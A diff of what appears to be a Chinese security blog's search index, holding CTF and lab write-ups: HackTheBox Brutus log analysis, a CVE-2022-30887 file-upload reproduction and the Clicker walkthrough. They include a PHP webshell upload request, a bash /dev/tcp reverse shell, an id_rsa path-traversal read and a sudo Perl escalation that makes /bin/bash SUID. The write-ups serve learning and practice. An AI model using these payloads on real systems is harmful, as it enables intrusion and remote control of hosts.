+<h1 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h1><p><strong>攻击者添加了一个新用户作为服务器上持久性策略的一部分，并为该新用户帐户授予了更高的权限。该帐户的名称是什么？</strong></p>
+<p>很明显给了<code>cyberjunkie</code>用户shell的权限</p>
+<p><img src="/article/Brutus-HackTheBox/image-20240421230548524.png"></p>
+<h1 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h1><p><strong>用于持久性的 MITRE ATT&amp;CK 子技术 ID 是什么？</strong></p>
+<p>善于使用搜索引擎</p>
+<p><img src="/article/Brutus-HackTheBox/image-20240421230752033.png"></p>
+<h1 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h1><p><strong>根据先前确认的身份验证时间和 auth.log 中的会话结束，攻击者的第一个 SSH 会话持续了多长时间？ （秒）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2</span><br><span class="line">Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184</span><br></pre></td></tr></table></figure>
+
+<p>不过日志上时间不准确，实际上登陆时间为<code>06:32:45</code>，所以持续了279秒</p>
+<h1 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h1><p><strong>攻击者登录他们的后门帐户并利用他们的更高权限下载脚本。使用 sudo 执行的完整命令是什么？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>日志分析</category>
+      </categories>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>IClean-HackTheBox</title>
+    <url>/article/IClean-HackTheBox.html</url>
+    <content><![CDATA[<h1 id="IClean-HackTheBox"><a href="#IClean-HackTheBox" class="headerlink" title="IClean-HackTheBox"></a>IClean-HackTheBox</h1><p><strong>信息搜集</strong></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2022-32991</title>
     <url>/article/CVE-2022-32991.html</url>
     <content><![CDATA[<p>该CMS的welcome.php中存在SQL注入攻击</p>
@@ -204,124 +294,26 @@
       </categories>
   </entry>
   <entry>
-    <title>Clicker-HackTheBox</title>
-    <url>/article/Clicker-HackTheBox.html</url>
-    <content><![CDATA[<p>session伪造、perl_startup提权</p>
+    <title>CVE-2022-30887</title>
+    <url>/article/CVE-2022-30887.html</url>
+    <content><![CDATA[<p>多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的，该CMS中php_action&#x2F;editProductImage.php存在任意文件上传漏洞</p>
 <span id="more"></span>
 
+<h1 id="CVE-2022-30887"><a href="#CVE-2022-30887" class="headerlink" title="CVE-2022-30887"></a>CVE-2022-30887</h1><p>打开题目，利用社工手段得到用户密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">email：mayuri.infospace@gmail.com</span><br><span class="line">password：mayurik</span><br></pre></td></tr></table></figure>
 
+<p>登陆成功后找到文件上传点</p>
+<p><img src="/article/CVE-2022-30887/image-20240413113616413.png"></p>
+<p>不过这里的洞被修复了，然后找到我们可以修改存在的药品图片</p>
+<p><img src="/article/CVE-2022-30887/image-20240413123550782.png"></p>
+<p>发包即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /php_action/editProductImage.php?id=1 HTTP/1.1</span><br><span class="line">Host: eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------190811817834681586072859788548</span><br><span class="line">Content-Length: 489</span><br><span class="line">Origin: http://eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com/editproduct.php?id=1</span><br><span class="line">Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1712973768; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1712981784; googtrans=/en/zh-CN; PHPSESSID=fk5vtlalgr7ok0d8dce8l6emof; googtrans=/en/zh-CN</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;old_image&quot;</span><br><span class="line"></span><br><span class="line">tab.jpg</span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;productImage&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php system($_POST[1]);?&gt;</span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;btn&quot;</span><br><span class="line"></span><br><span class="line">-----------------------------190811817834681586072859788548--</span><br></pre></td></tr></table></figure>
 
-<h1 id="Clicker-HackTheBox"><a href="#Clicker-HackTheBox" class="headerlink" title="Clicker-HackTheBox"></a>Clicker-HackTheBox</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描一下端口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v -p- --min-rate 1000 10.10.11.232</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Clicker-HackTheBox/image-20240109203146750.png"></p>
-<p>扫描结果</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.52 ((Ubuntu)) //重定向</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br></pre></td></tr></table></figure>
-
-<p>我们往下看发现启用了nfs协议</p>
-<p><img src="/article/Clicker-HackTheBox/image-20240109230610834.png"></p>
-<p>去网上查询下相关资料 <a href="https://zhuanlan.zhihu.com/p/607202498?utm_id=0">参考文章</a></p>
-<blockquote>
-<p>NFS最大的功能就是可以透过网络，让不同的机器、不同的操作系统、可以彼此分享个别的档案(share  files)。所以，你也可以简单地将它看做是一个文件服务器(file  server)。这个NFS服务器可以让你的PC来将网络远程的NFS服务器分享的目录，挂载到本地端的机器当中，在本地端的机器看起来，那个远程主机的目录就好像是自己的一个磁盘分区槽一样(partition)，使用上相当的便利。</p>
-</blockquote>
-<p>既然可以远程读取文件，那么我们使用mount命令将远程NFS文件系统挂载到本地目录</p>
-<p>在本地创建目录<code>mnt/nfs_file</code>，然后读取根目录文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mount -o nolock 10.10.11.232:/ ~/test/mnt/nfs_file</span><br></pre></td></tr></table></figure>
-
-<p>注：<code>-o</code>：指定挂载选项，比如读写权限、访问权限等</p>
-<p>​		<code>nolock</code> 是在挂载 NFS 文件系统时的一种选项，用于禁用文件锁定机制，使得同时进行读写操作不受文件锁定限制</p>
-<p>我们ls一下，发现zip文件</p>
-<p><img src="/article/Clicker-HackTheBox/image-20240109232705184.png"></p>
-<p>解压发现不行，用cp命令复制到本地即可</p>
-<p><img src="/article/Clicker-HackTheBox/image-20240109233234476.png"></p>
-<p>由于80端口出现重定向，那么我们添加域名到<code>/etc/hosts</code></p>
-<p>开始进行下一步</p>
-<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>我们在admin.php注意到有对session进行身份验证，如果验证失败则重定向到index.php</p>
-<p><img src="/article/Clicker-HackTheBox/image-20240110162754718.png"></p>
-<p>那么我们尝试得到admin的session，接着在save_game.php找到可利用的地方</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">include_once(&quot;db_utils.php&quot;);</span><br><span class="line"></span><br><span class="line">if (isset($_SESSION[&#x27;PLAYER&#x27;]) &amp;&amp; $_SESSION[&#x27;PLAYER&#x27;] != &quot;&quot;) &#123;</span><br><span class="line">	$args = [];</span><br><span class="line">	foreach($_GET as $key=&gt;$value) &#123;</span><br><span class="line">		if (strtolower($key) === &#x27;role&#x27;) &#123;</span><br><span class="line">			// prevent malicious users to modify role</span><br><span class="line">			header(&#x27;Location: /index.php?err=Malicious activity detected!&#x27;);</span><br><span class="line">			die;</span><br><span class="line">		&#125;</span><br><span class="line">		$args[$key] = $value;</span><br><span class="line">	&#125;</span><br><span class="line">	save_profile($_SESSION[&#x27;PLAYER&#x27;], $_GET);</span><br><span class="line">	// update session info</span><br><span class="line">	$_SESSION[&#x27;CLICKS&#x27;] = $_GET[&#x27;clicks&#x27;];</span><br><span class="line">	$_SESSION[&#x27;LEVEL&#x27;] = $_GET[&#x27;level&#x27;];</span><br><span class="line">	header(&#x27;Location: /index.php?msg=Game has been saved!&#x27;);	</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>简单分析一下，可以通过foreach对GET参数进行遍历，如果<code>$key</code>不为role（不区分大小写），那么<code>$args[$key] = $value;</code>进行赋值，调用save_profile函数去更新session，修改成功则返回<code>Game has been saved!</code></p>
-<p>这里我们搜索一下<code>$_SESSION[&#39;PLAYER&#39;]</code>是怎么来的，发现是由username决定的也就是登陆者身份</p>
-<p><img src="/article/Clicker-HackTheBox/image-20240110164127075.png"></p>
-<p>那么我们可以借助GET传参<code>role=Admin</code>来更新并得到admin的session，但要绕过<code>if (strtolower($key) === &#39;role&#39;)</code>判断</p>
-<p>这里本地测试发现，利用换行符<code>%0a</code>就行了</p>
-<p><img src="/article/Clicker-HackTheBox/image-20240110200952730.png"></p>
-<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>我们随便注册登录后点击play进入游戏，然后save的时候抓包</p>
-<p><img src="/article/Clicker-HackTheBox/image-20240110165933805.png"></p>
-<p>放行，提示修改成功</p>
-<p><img src="/article/Clicker-HackTheBox/image-20240110165957356.png"></p>
-<p>然后退出重新登录，发现多了一个功能</p>
-<p><img src="/article/Clicker-HackTheBox/image-20240110170626598.png"></p>
-<p>点进去看看发现有四个用户</p>
-<p>有个导出表格export选项，点击得到保存的路径</p>
-<p><img src="/article/Clicker-HackTheBox/image-20240110170802276.png"></p>
-<p>访问一下</p>
-<p><img src="/article/Clicker-HackTheBox/image-20240110170946574.png"></p>
-<p>我们抓包看看保存的过程发现拓展名可控</p>
-<p>尝试修改为php成功</p>
-<p><img src="/article/Clicker-HackTheBox/image-20240110171226227.png"></p>
-<p>既然可以修改为php后缀，那么我们寻找下写马的位置。很明显，保存的数据中只有nickname可以让我们写马，而如何修改nickname的值就和刚刚修改role一样的办法</p>
-<p>点击play，然后save的时候抓包</p>
-<p>（注意<code>?</code>要url编码一下）</p>
-<p><img src="/article/Clicker-HackTheBox/image-20240110172332221.png"></p>
-<p>然后还是一样回显保存成功，那么说明成功写入马</p>
-<p>继续按照刚刚那样抓包修改导出拓展名为php，然后访问保存路径成功RCE</p>
-<p><img src="/article/Clicker-HackTheBox/image-20240110172633202.png"></p>
-<p>我们将反弹shell命令url编码一下，然后执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?1=bash%20%2Dc%20%22bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E14%2E74%2F1028%200%3E%261%22</span><br></pre></td></tr></table></figure>
-
-<p>成功反弹shell</p>
-<p><img src="/article/Clicker-HackTheBox/image-20240110172943982.png"></p>
-<p>我们尝试访问<code>/home/jack</code>发现不行，接着在<code>/opt/manage</code>发现可疑文件</p>
-<p><img src="/article/Clicker-HackTheBox/image-20240110175535438.png"></p>
-<p>貌似是二进制文件execute_query的使用说明</p>
-<p>我们在连接的靶机开启http服务，使用wget命令下载下来该二进制文件</p>
-<p><img src="/article/Clicker-HackTheBox/image-20240110190318094.png"></p>
-<p>然后丢到ida里F5反编译</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  size_t v4; // rbx</span><br><span class="line">  size_t v5; // rax</span><br><span class="line">  size_t v6; // rbx</span><br><span class="line">  size_t v7; // rax</span><br><span class="line">  int v8; // [rsp+10h] [rbp-B0h]</span><br><span class="line">  char *dest; // [rsp+18h] [rbp-A8h]</span><br><span class="line">  char *name; // [rsp+20h] [rbp-A0h]</span><br><span class="line">  char *command; // [rsp+28h] [rbp-98h]</span><br><span class="line">  char s[32]; // [rsp+30h] [rbp-90h] BYREF</span><br><span class="line">  char src[88]; // [rsp+50h] [rbp-70h] BYREF</span><br><span class="line">  unsigned __int64 v14; // [rsp+A8h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v14 = __readfsqword(0x28u);</span><br><span class="line">  if ( argc &gt; 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = atoi(argv[1]);</span><br><span class="line">    dest = (char *)calloc(0x14uLL, 1uLL);</span><br><span class="line">    switch ( v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 0:</span><br><span class="line">        puts(&quot;ERROR: Invalid arguments&quot;);</span><br><span class="line">        return 2;</span><br><span class="line">      case 1:</span><br><span class="line">        strncpy(dest, &quot;create.sql&quot;, 0x14uLL);</span><br><span class="line">        goto LABEL_10;</span><br><span class="line">      case 2:</span><br><span class="line">        strncpy(dest, &quot;populate.sql&quot;, 0x14uLL);</span><br><span class="line">        goto LABEL_10;</span><br><span class="line">      case 3:</span><br><span class="line">        strncpy(dest, &quot;reset_password.sql&quot;, 0x14uLL);</span><br><span class="line">        goto LABEL_10;</span><br><span class="line">      case 4:</span><br><span class="line">        strncpy(dest, &quot;clean.sql&quot;, 0x14uLL);</span><br><span class="line">        goto LABEL_10;</span><br><span class="line">      default:</span><br><span class="line">        strncpy(dest, argv[2], 0x14uLL);</span><br><span class="line">LABEL_10:</span><br><span class="line">        strcpy(s, &quot;/home/jack/queries/&quot;);</span><br><span class="line">        v4 = strlen(s);</span><br><span class="line">        v5 = strlen(dest);</span><br><span class="line">        name = (char *)calloc(v4 + v5 + 1, 1uLL);</span><br><span class="line">        strcat(name, s);</span><br><span class="line">        strcat(name, dest);</span><br><span class="line">        setreuid(0x3E8u, 0x3E8u);</span><br><span class="line">        if ( access(name, 4) )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;File not readable or not found&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          strcpy(src, &quot;/usr/bin/mysql -u clicker_db_user --password=&#x27;clicker_db_password&#x27; clicker -v &lt; &quot;);</span><br><span class="line">          v6 = strlen(src);</span><br><span class="line">          v7 = strlen(dest);</span><br><span class="line">          command = (char *)calloc(v6 + v7 + 1, 1uLL);</span><br><span class="line">          strcat(command, src);</span><br><span class="line">          strcat(command, name);</span><br><span class="line">          system(command);</span><br><span class="line">        &#125;</span><br><span class="line">        result = 0;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;ERROR: not enough arguments&quot;);</span><br><span class="line">    return 1;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>然后就卡住了，于是参考下国外师傅写的<a href="https://medium.com/@depradip_8731/clicker-htb-writeup-walkthrough-f9bc00b57dee">wp</a>是去读取了jack的id_rsa私钥</p>
-<p>这里的参数5是因为在上述代码中如果不为1234中的一个，就会执行第三个命令行参数 <code>argv[2]</code> 的内容复制到 <code>dest</code> 变量中</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">default:</span><br><span class="line">    strncpy(dest, argv[2], 0x14uLL);</span><br></pre></td></tr></table></figure>
-
-<p>然后拼接文件路径，然后检查文件是否可读。如果文件不可读或者不存在，程序会输出 “File not readable or not found”。否则，将会构建一个 MySQL 命令并执行它，因为拼接的路径为<code>/home/jack/queries/</code>，所以要先返回上一级目录</p>
-<p>payload如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./execute_query 5 ../.ssh/id_rsa</span><br></pre></td></tr></table></figure>
-
-<p>成功读取</p>
-<p><img src="/article/Clicker-HackTheBox/image-20240110180639183.png"></p>
-<p>将这一长串保存下来命名为id_rsa</p>
-<p>由于为了确保私钥的安全性，私钥文件应该只对所有者有读写权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure>
-
-<p>然后注意OpenSSH内容格式不对，所以将三个<code>-</code>修改为五个</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAAB...</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
-
-<p>直接ssh连接，得到user的flag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa jack@10.10.11.232</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Clicker-HackTheBox/image-20240110184119487.png"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们sudo发现有monitor.sh，然后cat看下具体内容</p>
-<p><img src="/article/Clicker-HackTheBox/image-20240110184926380.png"></p>
-<p>这里注意到两个文件<code>/usr/bin/xml_pp</code>和<code>/usr/bin/echo</code>（后者并没有什么特殊用处）</p>
-<p>而我们跟进<code>/usr/bin/xml_pp</code>发现是perl脚本运行</p>
-<p><img src="/article/Clicker-HackTheBox/image-20240110185423524.png"></p>
-<p>通过搜索得知一种名为perl_startup的提权方式 <a href="https://www.exploit-db.com/exploits/39702">参考文章</a></p>
-<p>我们直接给monitor.sh赋予<code>/bin/bash</code>权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo PERL5OPT=-d PERL5DB=&#x27;exec &quot;chmod u+s /bin/bash&quot;&#x27; /opt/monitor.sh</span><br><span class="line">//u+s表示给user用户添加权限，即/bin/bash</span><br></pre></td></tr></table></figure>
-
-<p>然后再<code>bash -p</code>即可（用于启用特权模式（privileged mode）的一个选项，保留有效用户的特权和权限）</p>
-<p>得到root的flag</p>
-<p><img src="/article/Clicker-HackTheBox/image-20240110185919717.png"></p>
 ]]></content>
       <categories>
-        <category>渗透</category>
+        <category>春秋云镜</category>
+        <category>漏洞复现</category>
       </categories>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>提权</tag>
-      </tags>
   </entry>
   <entry>
     <title>Headless-HackTheBox</title>
@@ -504,19 +496,6 @@
       </tags>
   </entry>
   <entry>
-    <title>IClean-HackTheBox</title>
-    <url>/article/IClean-HackTheBox.html</url>
-    <content><![CDATA[<h1 id="IClean-HackTheBox"><a href="#IClean-HackTheBox" class="headerlink" title="IClean-HackTheBox"></a>IClean-HackTheBox</h1><p><strong>信息搜集</strong></p>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Jenkins文件读取漏洞(CVE-2024-23897)</title>
     <url>/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897.html</url>
     <content><![CDATA[<p>最近实在不知道做什么，跟着p神复现下比较火的漏洞</p>
@@ -584,6 +563,204 @@
       <categories>
         <category>漏洞分析</category>
       </categories>
+  </entry>
+  <entry>
+    <title>Clicker-HackTheBox</title>
+    <url>/article/Clicker-HackTheBox.html</url>
+    <content><![CDATA[<p>session伪造、perl_startup提权</p>
+<span id="more"></span>
+
+
+
+<h1 id="Clicker-HackTheBox"><a href="#Clicker-HackTheBox" class="headerlink" title="Clicker-HackTheBox"></a>Clicker-HackTheBox</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描一下端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v -p- --min-rate 1000 10.10.11.232</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Clicker-HackTheBox/image-20240109203146750.png"></p>
+<p>扫描结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.52 ((Ubuntu)) //重定向</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br></pre></td></tr></table></figure>
+
+<p>我们往下看发现启用了nfs协议</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240109230610834.png"></p>
+<p>去网上查询下相关资料 <a href="https://zhuanlan.zhihu.com/p/607202498?utm_id=0">参考文章</a></p>
+<blockquote>
+<p>NFS最大的功能就是可以透过网络，让不同的机器、不同的操作系统、可以彼此分享个别的档案(share  files)。所以，你也可以简单地将它看做是一个文件服务器(file  server)。这个NFS服务器可以让你的PC来将网络远程的NFS服务器分享的目录，挂载到本地端的机器当中，在本地端的机器看起来，那个远程主机的目录就好像是自己的一个磁盘分区槽一样(partition)，使用上相当的便利。</p>
+</blockquote>
+<p>既然可以远程读取文件，那么我们使用mount命令将远程NFS文件系统挂载到本地目录</p>
+<p>在本地创建目录<code>mnt/nfs_file</code>，然后读取根目录文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mount -o nolock 10.10.11.232:/ ~/test/mnt/nfs_file</span><br></pre></td></tr></table></figure>
+
+<p>注：<code>-o</code>：指定挂载选项，比如读写权限、访问权限等</p>
+<p>​		<code>nolock</code> 是在挂载 NFS 文件系统时的一种选项，用于禁用文件锁定机制，使得同时进行读写操作不受文件锁定限制</p>
+<p>我们ls一下，发现zip文件</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240109232705184.png"></p>
+<p>解压发现不行，用cp命令复制到本地即可</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240109233234476.png"></p>
+<p>由于80端口出现重定向，那么我们添加域名到<code>/etc/hosts</code></p>
+<p>开始进行下一步</p>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>我们在admin.php注意到有对session进行身份验证，如果验证失败则重定向到index.php</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110162754718.png"></p>
+<p>那么我们尝试得到admin的session，接着在save_game.php找到可利用的地方</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">include_once(&quot;db_utils.php&quot;);</span><br><span class="line"></span><br><span class="line">if (isset($_SESSION[&#x27;PLAYER&#x27;]) &amp;&amp; $_SESSION[&#x27;PLAYER&#x27;] != &quot;&quot;) &#123;</span><br><span class="line">	$args = [];</span><br><span class="line">	foreach($_GET as $key=&gt;$value) &#123;</span><br><span class="line">		if (strtolower($key) === &#x27;role&#x27;) &#123;</span><br><span class="line">			// prevent malicious users to modify role</span><br><span class="line">			header(&#x27;Location: /index.php?err=Malicious activity detected!&#x27;);</span><br><span class="line">			die;</span><br><span class="line">		&#125;</span><br><span class="line">		$args[$key] = $value;</span><br><span class="line">	&#125;</span><br><span class="line">	save_profile($_SESSION[&#x27;PLAYER&#x27;], $_GET);</span><br><span class="line">	// update session info</span><br><span class="line">	$_SESSION[&#x27;CLICKS&#x27;] = $_GET[&#x27;clicks&#x27;];</span><br><span class="line">	$_SESSION[&#x27;LEVEL&#x27;] = $_GET[&#x27;level&#x27;];</span><br><span class="line">	header(&#x27;Location: /index.php?msg=Game has been saved!&#x27;);	</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>简单分析一下，可以通过foreach对GET参数进行遍历，如果<code>$key</code>不为role（不区分大小写），那么<code>$args[$key] = $value;</code>进行赋值，调用save_profile函数去更新session，修改成功则返回<code>Game has been saved!</code></p>
+<p>这里我们搜索一下<code>$_SESSION[&#39;PLAYER&#39;]</code>是怎么来的，发现是由username决定的也就是登陆者身份</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110164127075.png"></p>
+<p>那么我们可以借助GET传参<code>role=Admin</code>来更新并得到admin的session，但要绕过<code>if (strtolower($key) === &#39;role&#39;)</code>判断</p>
+<p>这里本地测试发现，利用换行符<code>%0a</code>就行了</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110200952730.png"></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>我们随便注册登录后点击play进入游戏，然后save的时候抓包</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110165933805.png"></p>
+<p>放行，提示修改成功</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110165957356.png"></p>
+<p>然后退出重新登录，发现多了一个功能</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110170626598.png"></p>
+<p>点进去看看发现有四个用户</p>
+<p>有个导出表格export选项，点击得到保存的路径</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110170802276.png"></p>
+<p>访问一下</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110170946574.png"></p>
+<p>我们抓包看看保存的过程发现拓展名可控</p>
+<p>尝试修改为php成功</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110171226227.png"></p>
+<p>既然可以修改为php后缀，那么我们寻找下写马的位置。很明显，保存的数据中只有nickname可以让我们写马，而如何修改nickname的值就和刚刚修改role一样的办法</p>
+<p>点击play，然后save的时候抓包</p>
+<p>（注意<code>?</code>要url编码一下）</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110172332221.png"></p>
+<p>然后还是一样回显保存成功，那么说明成功写入马</p>
+<p>继续按照刚刚那样抓包修改导出拓展名为php，然后访问保存路径成功RCE</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110172633202.png"></p>
+<p>我们将反弹shell命令url编码一下，然后执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?1=bash%20%2Dc%20%22bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E14%2E74%2F1028%200%3E%261%22</span><br></pre></td></tr></table></figure>
+
+<p>成功反弹shell</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110172943982.png"></p>
+<p>我们尝试访问<code>/home/jack</code>发现不行，接着在<code>/opt/manage</code>发现可疑文件</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110175535438.png"></p>
+<p>貌似是二进制文件execute_query的使用说明</p>
+<p>我们在连接的靶机开启http服务，使用wget命令下载下来该二进制文件</p>
+<p><img src="/article/Clicker-HackTheBox/image-20240110190318094.png"></p>
+<p>然后丢到ida里F5反编译</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  size_t v4; // rbx</span><br><span class="line">  size_t v5; // rax</span><br><span class="line">  size_t v6; // rbx</span><br><span class="line">  size_t v7; // rax</span><br><span class="line">  int v8; // [rsp+10h] [rbp-B0h]</span><br><span class="line">  char *dest; // [rsp+18h] [rbp-A8h]</span><br><span class="line">  char *name; // [rsp+20h] [rbp-A0h]</span><br><span class="line">  char *command; // [rsp+28h] [rbp-98h]</span><br><span class="line">  char s[32]; // [rsp+30h] [rbp-90h] BYREF</span><br><span class="line">  char src[88]; // [rsp+50h] [rbp-70h] BYREF</span><br><span class="line">  unsigned __int64 v14; // [rsp+A8h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v14 = __readfsqword(0x28u);</span><br><span class="line">  if ( argc &gt; 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = atoi(argv[1]);</span><br><span class="line">    dest = (char *)calloc(0x14uLL, 1uLL);</span><br><span class="line">    switch ( v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 0:</span><br><span class="line">        puts(&quot;ERROR: Invalid arguments&quot;);</span><br><span class="line">        return 2;</span><br><span class="line">      case 1:</span><br><span class="line">        strncpy(dest, &quot;create.sql&quot;, 0x14uLL);</span><br><span class="line">        goto LABEL_10;</span><br><span class="line">      case 2:</span><br><span class="line">        strncpy(dest, &quot;populate.sql&quot;, 0x14uLL);</span><br><span class="line">        goto LABEL_10;</span><br><span class="line">      case 3:</span><br><span class="line">        strncpy(dest, &quot;reset_password.sql&quot;, 0x14uLL);</span><br><span class="line">        goto LABEL_10;</span><br><span class="line">      case 4:</span><br><span class="line">        strncpy(dest, &quot;clean.sql&quot;, 0x14uLL);</span><br><span class="line">        goto LABEL_10;</span><br><span class="line">      default:</span><br><span class="line">        